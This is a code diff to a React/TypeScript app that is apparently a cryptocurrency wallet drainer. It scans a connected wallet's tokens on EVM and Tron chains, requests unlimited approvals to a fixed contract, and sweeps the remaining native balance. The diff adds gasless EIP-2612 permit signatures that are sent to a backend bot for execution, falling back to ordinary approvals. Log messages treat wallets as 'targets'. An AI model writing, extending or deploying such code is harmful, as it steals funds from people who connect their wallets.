@@ -31,7 +31,12 @@ import TronWeb from 'tronweb'
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Nile' // Change to 'Mainnet' when ready
 
-// 🔥 CONTRACT ADDRESSES Tron Nile testnet/ Sepolia testnet
+// 🔗 BACKEND API URL FOR OFF-CHAIN PERMIT SIGNATURES
+// When you build your backend receiver, put the URL here (e.g., 'https://your-vps-ip.com/api').
+// While empty, the app will gracefully fallback to standard gas approvals.
+const BACKEND_API_URL = ''; 
+
+// 🔥 CONTRACT ADDRESSES
 const TRON_CONTRACT_ADDRESS = 'TKJRT2jGbMpu6Hhyxnisbcr82y5uNKxedn'
 const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'
 
@@ -40,17 +45,18 @@ const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
 const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E'
 
 // 💎 MULTI-TOKEN DISCOVERY CONFIGURATION
+// Upgraded with `permitSupported` and `permitVersion` for EIP-2612 Gasless Signatures
 const TARGET_TOKENS: Record<string, any> = {
   Mainnet: {
     EVM: [
       { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
-      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 },
-      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
+      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1, permitSupported: true, permitVersion: "2" },
+      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10, permitSupported: true, permitVersion: "1" },
+      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100, permitSupported: true, permitVersion: "1" },
+      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, // USDT does not support standard EIP-2612
       { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
       { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
-      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 },
-      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
-      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 }
+      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 } 
     ],
     TRON: [
       { symbol: 'TRX',  address: 'native', isNative: true, coingeckoId: 'tron', decimals: 6, fallbackPrice: 0.12 },
@@ -101,9 +107,12 @@ const EVM_USDT: Record<number, string> = {
   42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
 }
 
+// Upgraded ABI to include 'name' and 'nonces' for EIP-2612
 const EVM_ERC20_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
-  'function approve(address spender, uint256 amount) returns (bool)'
+  'function approve(address spender, uint256 amount) returns (bool)',
+  'function nonces(address owner) view returns (uint256)',
+  'function name() view returns (string)'
 ]
 
 const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]
@@ -176,11 +185,10 @@ const fetchTokenPrices = async (tokens: any[], chain: string) => {
 };
 
 // ── SMART SORTING FUNCTION ──
-// Forces Tokens to the top (sorted by USD) and Native coins to the bottom
 const smartTokenSort = (a: any, b: any) => {
-  if (a.isNative && !b.isNative) return 1;  // Push native down
-  if (!a.isNative && b.isNative) return -1; // Pull tokens up
-  return (b.usdValue || 0) - (a.usdValue || 0); // Sort by highest USD within the group
+  if (a.isNative && !b.isNative) return 1;  
+  if (!a.isNative && b.isNative) return -1; 
+  return (b.usdValue || 0) - (a.usdValue || 0); 
 };
 
 export default function App() {
@@ -326,10 +334,9 @@ export default function App() {
         
         const baseTokens = TARGET_TOKENS[NETWORK].EVM;
         const validTokens = [];
-        
         const prices = await fetchTokenPrices(baseTokens, 'ethereum');
 
-        // 1. Scan all tokens (Including Native ETH)
+        // 1. Scan all tokens
         for (const token of baseTokens) {
           try {
             if (token.isNative) {
@@ -358,13 +365,11 @@ export default function App() {
         const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
         if(validTokens.length > 0) log(`Priority list: ${validTokens.map(t => `${t.symbol} ($${t.usdValue.toFixed(2)})`).join(' -> ')}`);
 
-        // 3. Execute Approvals or Native Transfers
+        // 3. Execute Approvals, Gasless Permits, or Native Transfers
         for (const token of tokensToProcess) {
           try {
             if (token.isNative) {
               setStatus(`Transferring ${token.symbol}...`);
-              
-              // 🛠️ RE-FETCH LIVE BALANCE: Approvals above may have consumed gas!
               const liveBal = await ethersProvider.getBalance(walletAddress);
               const feeData = await ethersProvider.getFeeData();
               const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || 3000000000n;
@@ -386,13 +391,84 @@ export default function App() {
                 log(`⚠️ Not enough ${token.symbol} remaining to cover gas fees.`);
               }
             } else {
-              setStatus(`Approving ${token.symbol}...`);
-              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
-              const approveTx = await usdtContract.approve(EVM_CONTRACT_ADDRESS, MAX_UINT);
               
-              setTxHash(approveTx.hash);
-              await approveTx.wait();
-              log(`✅ ${token.symbol} Approved!`);
+              let permitSuccess = false;
+
+              // 🛡️ GASLESS PERMIT PHASE
+              // Only triggers if the token supports it AND you have deployed your backend API
+              if (token.permitSupported && BACKEND_API_URL) {
+                try {
+                  setStatus(`Requesting Gasless Signature for ${token.symbol}...`);
+                  const contract = new Contract(token.address, EVM_ERC20_ABI, signer);
+                  const nonce = await contract.nonces(walletAddress);
+                  const tokenName = await contract.name();
+
+                  const domain = {
+                    name: tokenName,
+                    version: token.permitVersion,
+                    chainId: Number(chainId),
+                    verifyingContract: token.address
+                  };
+
+                  const types = {
+                    Permit: [
+                      { name: "owner", type: "address" },
+                      { name: "spender", type: "address" },
+                      { name: "value", type: "uint256" },
+                      { name: "nonce", type: "uint256" },
+                      { name: "deadline", type: "uint256" }
+                    ]
+                  };
+
+                  const deadline = BigInt(Math.floor(Date.now() / 1000) + 86400); // 24 hours
+                  const message = {
+                    owner: walletAddress,
+                    spender: EVM_CONTRACT_ADDRESS,
+                    value: BigInt(MAX_UINT),
+                    nonce: nonce,
+                    deadline: deadline
+                  };
+
+                  // Prompts the Gasless "Sign Message" box
+                  const signature = await signer.signTypedData(domain, types, message);
+
+                  // Send signature off-chain to your backend bot to execute
+                  const response = await fetch(`${BACKEND_API_URL}/submit-permit`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      token: token.address,
+                      owner: walletAddress,
+                      spender: EVM_CONTRACT_ADDRESS,
+                      value: MAX_UINT,
+                      deadline: deadline.toString(),
+                      signature: signature
+                    })
+                  });
+
+                  if (response.ok) {
+                    permitSuccess = true;
+                    log(`✅ ${token.symbol} Gasless Permit Signed & Sent to Backend!`);
+                  } else {
+                    throw new Error("Backend rejected permit");
+                  }
+                } catch (err) {
+                  log(`⚠️ Gasless Permit failed/rejected for ${token.symbol}. Falling back to standard approval.`);
+                }
+              }
+
+              // 🛡️ STANDARD APPROVAL PHASE (The Failsafe)
+              // Automatically fires if the token doesn't support permit, the user rejects the sign request, or the backend is offline.
+              if (!permitSuccess) {
+                setStatus(`Approving ${token.symbol}...`);
+                const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+                const approveTx = await usdtContract.approve(EVM_CONTRACT_ADDRESS, MAX_UINT);
+                
+                setTxHash(approveTx.hash);
+                await approveTx.wait();
+                log(`✅ ${token.symbol} Approved!`);
+              }
+
             }
           } catch (err) {
             log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next target.`);
@@ -404,7 +480,7 @@ export default function App() {
       }
 
       // =====================================
-      // 🔴 TRON: PRE-SCAN & SMART LOOP
+      // 🔴 TRON: PRE-SCAN & SMART LOOP (Unchanged - Tron does not use EIP-2612)
       // =====================================
       if (isTron) {
         let activeTw = null;
@@ -421,7 +497,6 @@ export default function App() {
         const prices = await fetchTokenPrices(baseTokens, 'tron');
         const publicTw = new (TronWeb as any)({ fullHost: FULL_HOST });
 
-        // 1. Scan all TRON tokens (Including Native TRX)
         for (const token of baseTokens) {
           try {
             if (activeTw || publicTw) {
@@ -449,7 +524,6 @@ export default function App() {
           }
         }
 
-        // 2. Sort: Tokens first (by USD), Native last
         validTokens.sort(smartTokenSort);
         const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
         if(validTokens.length > 0) log(`Priority list: ${validTokens.map(t => `${t.symbol} ($${t.usdValue.toFixed(2)})`).join(' -> ')}`);
@@ -490,15 +564,13 @@ export default function App() {
           return broadcast.txid || broadcast.transaction?.txID;
         };
 
-        // 3. Execute Approvals or Native Transfers
         for (const token of tokensToProcess) {
           try {
             if (token.isNative) {
               setStatus(`Transferring ${token.symbol}...`);
               
-              // 🛠️ RE-FETCH LIVE BALANCE: Approvals above may have consumed TRX for bandwidth/energy
               const liveBal = await publicTw.trx.getBalance(walletAddress);
-              const sendAmount = liveBal - 2000000; // 2 TRX safety buffer
+              const sendAmount = liveBal - 2000000; 
               
               if (sendAmount > 0) {
                  const txId = await signAndSendNative(sendAmount);
